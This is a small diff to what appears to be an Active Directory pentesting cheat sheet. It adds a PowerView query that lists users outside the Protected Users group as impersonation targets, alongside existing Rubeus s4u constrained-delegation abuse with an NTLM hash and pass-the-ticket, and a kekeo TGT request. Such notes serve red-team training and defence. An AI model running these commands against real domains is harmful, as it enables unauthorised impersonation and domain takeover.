@@ -494,6 +494,11 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 .\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
 
+#### Check for user to impersonate
+```
+Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+```
+
 #### Requesting TGT with kekeo
 ```
 ./kekeo.exe
